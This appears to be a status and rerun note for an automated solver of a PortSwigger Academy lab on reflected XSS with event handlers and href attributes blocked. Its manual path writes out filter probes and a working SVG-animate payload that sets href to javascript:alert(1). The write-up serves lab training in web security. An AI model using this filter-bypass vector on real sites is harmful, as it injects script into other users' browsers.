# RESUME — Reflected XSS with event handlers and href attributes blocked

**Status: COMPLETE — lab solved and verified.**

## Where things stand

* The live instance flipped from `is-notsolved` to
  `is-solved` on the first crafted search request. Baseline captured before the
  payload (`evidence/*_01-baseline-home-notsolved.html`), solved state in the
  very same exploit response (`evidence/*_02-first-exploit-response-solved.html`),
  so `caused by solver: yes`.
* Solver `solve.py`: exit 0, **10 requests, 3.7 s**.
* Root launcher: exact folder-name match, exit 0, 3.7 s solve / **4.0 s total**.
* Launcher test suite: 27 passed / 0 failed.
* Browser proof: trusted CDP click on the `<text>` node fired `alert("1")`
  (`evidence/*_browser-proof.txt`).

## Re-running on a fresh instance

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<new-lab-id>.web-security-academy.net/"
```

Nothing needs to be edited: the search parameter name, baseline state, filter
strings and all tags are read from the live instance at runtime.

Manual path if the solver ever fails:

1. `GET /` → confirm the title and `is-notsolved`.
2. `GET /?search=zzqq` → confirm the term is reflected unescaped into `<h1>`.
3. Probe the filter: `<b>` → 400 `"Tag is not allowed"`; `<svg onload=alert(1)>`
   → 400 `"Event is not allowed"`; `<a href=javascript:alert(1)>x</a>` → 400
   `"Attribute is not allowed"`.
4. Confirm `svg`, `a`, `animate`, `text` still return 200.
5. Send `/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`
   and re-read `/` for `widgetcontainer-lab-status is-solved`.

## Known failure modes

| Symptom | Cause |
|---|---|
| `control … -> UNEXPECTED` | filter changed on a new instance; re-measure before reusing the vector |
| `error: <animate> is no longer allowed` | PortSwigger tightened the whitelist; the vector needs a different allowed-tag path |
| 400 `"Attribute is not allowed"` on the exploit | `href=` appeared literally in the request — the attribute must only be produced by `<animate>` |
| `caused by solver: no (was already solved)` | expected when re-running against an already-solved instance |

## Session facts worth keeping

* Title: `Reflected XSS with event handlers and href attributes blocked`.
* Difficulty **EXPERT** (badge is client-rendered; read it in a browser).
* **No exploit server**: `GET /exploit` → 404, and the lab header has no
  `#exploit-link`. No victim-delivery step.
* The checker is server-side: the exploit request itself returns the solved
  banner, so a plain HTTP client is sufficient.
* The lab requires the vector to contain the word **Click** for the simulated
  user; the alert itself fires on a click regardless.
